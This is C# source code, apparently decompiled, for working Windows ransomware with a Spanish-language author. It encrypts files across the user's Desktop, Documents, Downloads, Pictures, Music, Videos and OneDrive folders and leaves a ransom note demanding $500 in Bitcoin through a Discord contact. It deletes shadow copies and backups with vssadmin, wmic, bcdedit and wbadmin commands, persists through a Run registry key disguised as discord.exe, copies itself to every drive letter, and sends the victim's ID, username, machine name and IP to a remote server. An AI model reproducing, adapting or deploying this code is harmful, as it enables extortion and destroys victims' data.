using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using ConsoleApp2;
using ConsoleApp2.Properties;
using Microsoft.Win32;

namespace conso;

internal class Program
{
	private const int SHERB_NOCONFIRMATION = 1;

	private const int SHERB_NOPROGRESSUI = 2;

	private const int SHERB_NOSOUND = 4;

	private const uint SPI_SETDESKWALLPAPER = 20u;

	private const uint SPIF_UPDATEINIFILE = 1u;

	private const uint SPIF_SENDWININICHANGE = 2u;

	public static string encryptedfiles;

	public static string ID;

	public static TextBox text = new TextBox();

	public static string random;

	public static string escritico = "no";

	public int isCritical = 1;

	public int notisCritical = 0;

	public int BreakOnTermination = 29;

	public static string nota_mostrar = "no";

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("ntdll.dll")]
	private static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	private static extern IntPtr NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	[DllImport("shell32.dll")]
	private static extern int SHEmptyRecycleBin(IntPtr hWnd, string pszRootPath, uint dwFlags);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 3, 4, 2, 6, 5, 1, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public void USB()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string location = Assembly.GetEntryAssembly()!.Location;
		string contents = "@echo off" + Environment.NewLine + "copy \"" + location + "\" A:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" B:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" D:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" E:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" F:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" G:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" H:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" I:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" J:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" K:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" L:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" M:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" N:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" Ñ:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" O:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" P:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" Q:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" R:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" S:\\winprotect.exe" + Environment.NewLine + Environment.NewLine + "copy \"" + location + "\" T:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" U:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" V:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" W:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" X:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" Y:\\winprotect.exe" + Environment.NewLine + "copy \"" + location + "\" Z:\\winprotect.exe" + Environment.NewLine + "exit";
		File.WriteAllText(folderPath + "\\usb_maker.bat", contents);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = folderPath + "\\usb_maker.bat";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
	}

	public void percodigo()
	{
	}

	public void cmd2()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/c @echo off & echo sigueme en github: https://github.com/AnderMoralDiaz!!! & start https://github.com/AnderMoralDiaz";
		Process.Start(processStartInfo);
	}

	public void inicio_void()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string text = "";
		try
		{
			text = File.ReadAllText(folderPath + "\\uac_location");
		}
		catch (Exception)
		{
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("discord", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe");
		if (text == "")
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
		}
		else
		{
			File.Copy(File.ReadAllText(folderPath + "\\uac_location"), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\discord.exe", overwrite: true);
		}
		try
		{
			File.Delete(folderPath + "\\uac_location");
		}
		catch (Exception)
		{
		}
	}

	public void autodestruir()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string location = Assembly.GetEntryAssembly()!.Location;
		string text = File.ReadAllText(folderPath + "\\uac_location");
		Path.GetFileNameWithoutExtension(location);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/c del \"" + location + "\" /F /Q";
		Process.Start(processStartInfo);
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
		processStartInfo2.FileName = "cmd.exe";
		processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo2.Arguments = "/c del \"" + text + "\" /F /Q";
		Process.Start(processStartInfo2);
	}

	public void EncryptFile(string file, string password)
	{
		try
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
			File.Move(file, file + ".qwertyuiopNS");
			Console.WriteLine("encrypted: " + file + " >> " + file + ".qwertyuiopNS");
			encryptedfiles = encryptedfiles + file + Environment.NewLine;
		}
		catch (Exception)
		{
		}
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string text = "si";
			string[] source = new string[1] { "//aqui_extensiones" };
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string fileName = Path.GetFileName(files[i]);
				string extension = Path.GetExtension(files[i]);
				if (!(extension == ".qwertyuiopNS") && !(fileName == "README.txt"))
				{
					if (text == "si")
					{
						EncryptFile(files[i], password);
					}
					else if (source.Contains(extension))
					{
						EncryptFile(files[i], password);
					}
				}
			}
			for (int i = 0; i < directories.Length; i++)
			{
				encryptDirectory(directories[i], password);
			}
		}
		catch (Exception)
		{
		}
	}

	public void mensaje(string location)
	{
		try
		{
			nota_mostrar = "si";
			string[] contents = new string[1] { "Hello! All your files have been encrypted...\r\n\r\n\r\nTo decrypt your files you need to write to decryption#1222 on DISCORD \r\n\r\nTHE ONLY WAY TO GET YOUR FILES BACK IS TO PAY $500 IN BITCOIN TO THE ADDRESS decryption#1222 SENDS YOU\r\n\r\n\r\nYOU MUST HAVE PROOF OF SENDING THE BITCOIN TO GET YOUR FILES BACK!\r\nDo not try to restore files without our help, this is useless, and can destroy your data permanently. If you are kind, the fee will be only $400....\r\n\r\nAs .exes are encrypted, please do this from your phone/tablet.\r\nIMPORTANT!\r\nPlease send all of these, personal id, computername, username, ect. to decryption#1222\r\n%PERSONALID%\r\n%USERNAME%\r\n%COMPUTERNAME%\r\n%DATE%\r\n%PRIVATEIP%".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
				.Replace("%DATE%", DateTime.Now.ToString())
				.Replace("%PRIVATEIP%", GetLocalIPAddress())
				.Replace("%ENCRIPTEDFILES%", encryptedfiles) };
			Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < directories.Length; i++)
			{
				messageCreator(directories[i]);
			}
			File.WriteAllLines(location + "\\README.txt", contents);
		}
		catch (Exception)
		{
		}
	}

	public void messageCreator(string location)
	{
		try
		{
			nota_mostrar = "si";
			string[] contents = new string[1] { "Hello! All your files have been encrypted...\r\n\r\n\r\nTo decrypt your files you need to write to decryption#1222 on DISCORD \r\n\r\nTHE ONLY WAY TO GET YOUR FILES BACK IS TO PAY $500 IN BITCOIN TO THE ADDRESS decryption#1222 SENDS YOU\r\n\r\n\r\nYOU MUST HAVE PROOF OF SENDING THE BITCOIN TO GET YOUR FILES BACK!\r\nDo not try to restore files without our help, this is useless, and can destroy your data permanently. If you are kind, the fee will be only $400....\r\n\r\nAs .exes are encrypted, please do this from your phone/tablet.\r\nIMPORTANT!\r\nPlease send all of these, personal id, computername, username, ect. to decryption#1222\r\n%PERSONALID%\r\n%USERNAME%\r\n%COMPUTERNAME%\r\n%DATE%\r\n%PRIVATEIP%".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
				.Replace("%DATE%", DateTime.Now.ToString())
				.Replace("%PRIVATEIP%", GetLocalIPAddress())
				.Replace("%ENCRIPTEDFILES%", encryptedfiles) };
			Directory.GetDirectories(location);
			File.WriteAllLines(location + "\\README.txt", contents);
		}
		catch (Exception)
		{
		}
	}

	public static string CreateId(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ6^(!')KzDRy'%W^s4.4fJ@vpr'3Jdz&:ZDr'7Hn}-;H}<%^2-(GGe2VNq#/}vQ^8;!gyJ7:E//.eyWwN)4uZ78!Pkb?}CT4#2jLC<VE.d#dG!Lj[kw#/@qPMs0"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ6^(!')KzDRy'%W^s4.4fJ@vpr'3Jdz&:ZDr'7Hn}-;H}<%^2-(GGe2VNq#/}vQ^8;!gyJ7:E//.eyWwN)4uZ78!Pkb?}CT4#2jLC<VE.d#dG!Lj[kw#/@qPMs0".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static string GetLocalIPAddress()
	{
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		int num = 0;
		IPAddress iPAddress;
		while (true)
		{
			if (num < addressList.Length)
			{
				iPAddress = addressList[num];
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					break;
				}
				num++;
				continue;
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}
		return iPAddress.ToString();
	}

	public static string Base64Encode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static void conectar()
	{
		try
		{
			string text = "https://example.com/";
			Console.WriteLine("string enlace creado");
			Console.WriteLine("string informacion creado");
			string address = text + "data.php?info=" + ((Control)Program.text).get_Text();
			Console.WriteLine("strings fusionados");
			WebClient webClient = new WebClient();
			Console.WriteLine("webclient creado");
			webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
			Console.WriteLine("webclient headers");
			Stream stream = webClient.OpenRead(text + "data.txt");
			Console.WriteLine("data");
			StreamReader streamReader = new StreamReader(stream);
			Console.WriteLine("reader");
			string text2 = streamReader.ReadToEnd();
			Console.WriteLine("s");
			stream.Close();
			Console.WriteLine("data close");
			streamReader.Close();
			Console.WriteLine("reader close");
			if (text2.Contains(ID))
			{
				Console.WriteLine("ID ya en el servidor");
				return;
			}
			new WebClient().DownloadString(address);
			Console.WriteLine("enviado");
		}
		catch (Exception)
		{
			conectar();
		}
	}

	public static void fondo()
	{
		try
		{
			File.Copy(CenterScreen.GetBackgroud(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\fondo_antiguo.jpg", overwrite: true);
			random = CreateId(30);
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
			if (File.Exists(folderPath + "\\image.jpg"))
			{
				SystemParametersInfo(20u, 0u, folderPath + "\\image.jpg", 3u);
				File.Delete(folderPath + "\\image.jpg");
			}
			else
			{
				File.WriteAllBytes(folderPath + "\\image" + random + ".jpg", Resources.wallpaper_jpg);
				SystemParametersInfo(20u, 0u, folderPath + "\\image" + random + ".jpg", 3u);
				File.Delete(folderPath + "\\image" + random + ".jpg");
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("ERRORRRRRRRRRRRRRRRR: " + ex.Message);
		}
	}

	public void borrar()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = " /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet";
		Process.Start(processStartInfo);
	}

	public void fond2(string path)
	{
		fondo();
	}

	public void start()
	{
		//IL_0380: Unknown result type (might be due to invalid IL or missing references)
		//IL_0387: Expected O, but got Unknown
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, 4);
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\image.jpg");
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
			string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
			string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
			string location2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "3D Objects");
			string location3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive");
			string password = "6^(!')KzDRy'%W^s4.4fJ@vpr'3Jdz&:ZDr'7Hn}-;H}<%^2-(GGe2VNq#/}vQ^8;!gyJ7:E//.eyWwN)4uZ78!Pkb?}CT4#2jLC<VE.d#dG!Lj[kw#/@qPMs";
			string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			inicio_void();
			if (File.Exists(folderPath6 + "\\ID"))
			{
				StreamReader streamReader = new StreamReader(folderPath6 + "\\ID");
				ID = streamReader.ReadToEnd();
				streamReader.Close();
			}
			else
			{
				ID = CreateId(40);
				StreamWriter streamWriter = new StreamWriter(folderPath6 + "\\ID");
				streamWriter.Write(ID);
				streamWriter.Close();
			}
			((Control)Program.text).set_Text("ID: " + ID + " enter nombre de usuario: " + Environment.UserName + " enter nombre de PC: " + Environment.MachineName + " enter fecha: " + DateTime.Now.ToString() + "enter ip privada: " + GetLocalIPAddress() + " enter estado: Encriptado enter lines-");
			encryptDirectory(folderPath, password);
			encryptDirectory(location, password);
			encryptDirectory(folderPath2, password);
			encryptDirectory(folderPath3, password);
			encryptDirectory(folderPath4, password);
			encryptDirectory(folderPath5, password);
			encryptDirectory(location2, password);
			encryptDirectory(location3, password);
			string[] contents = new string[1] { "Hello! All your files have been encrypted...\r\n\r\n\r\nTo decrypt your files you need to write to decryption#1222 on DISCORD \r\n\r\nTHE ONLY WAY TO GET YOUR FILES BACK IS TO PAY $500 IN BITCOIN TO THE ADDRESS decryption#1222 SENDS YOU\r\n\r\n\r\nYOU MUST HAVE PROOF OF SENDING THE BITCOIN TO GET YOUR FILES BACK!\r\nDo not try to restore files without our help, this is useless, and can destroy your data permanently. If you are kind, the fee will be only $400....\r\n\r\nAs .exes are encrypted, please do this from your phone/tablet.\r\nIMPORTANT!\r\nPlease send all of these, personal id, computername, username, ect. to decryption#1222\r\n%PERSONALID%\r\n%USERNAME%\r\n%COMPUTERNAME%\r\n%DATE%\r\n%PRIVATEIP%".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
				.Replace("%DATE%", DateTime.Now.ToString())
				.Replace("%PRIVATEIP%", GetLocalIPAddress())
				.Replace("%ENCRIPTEDFILES%", encryptedfiles) };
			mensaje(folderPath);
			mensaje(location);
			mensaje(folderPath2);
			mensaje(folderPath3);
			mensaje(folderPath4);
			mensaje(folderPath5);
			mensaje(location2);
			mensaje(location3);
			messageCreator(folderPath);
			messageCreator(location);
			messageCreator(folderPath2);
			messageCreator(folderPath3);
			messageCreator(folderPath4);
			messageCreator(folderPath5);
			messageCreator(location2);
			messageCreator(location3);
			if (!(nota_mostrar == "no"))
			{
				File.WriteAllLines(folderPath6 + "\\README.txt", contents);
				Process.Start(folderPath6 + "\\README.txt");
			}
			SHEmptyRecycleBin(IntPtr.Zero, Environment.GetFolderPath(Environment.SpecialFolder.Windows).Replace("windows", "").Replace("WINDOWS", "")
				.Replace("Windows", ""), 7u);
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref notisCritical, 4);
			NotifyIcon val = new NotifyIcon();
			val.set_Visible(true);
			val.set_Icon(SystemIcons.get_Asterisk());
			val.set_BalloonTipText("notmen");
			val.set_BalloonTipTitle("titmen");
			string text = "no";
			borrar();
			USB();
			while (text == "no")
			{
				text = ((!NetworkInterface.GetIsNetworkAvailable()) ? "no" : "si");
			}
			percodigo();
		}
		catch (Exception)
		{
		}
	}

	private static void Main(string[] args)
	{
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
			string text = "no";
			string text2 = "si";
			string text3 = "si";
			string text4 = "no";
			if (text2 == "no")
			{
				Program program = new Program();
				program.start();
			}
			else
			{
				if (!(text2 == "si"))
				{
					return;
				}
				while (text == "no")
				{
					if (NetworkInterface.GetIsNetworkAvailable())
					{
						text = "si";
						Program program = new Program();
						program.start();
					}
					else if (text3 == "si" && text4 == "no")
					{
						text4 = "si";
						MessageBox.Show("Please disable Anti virus and run as administer ", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
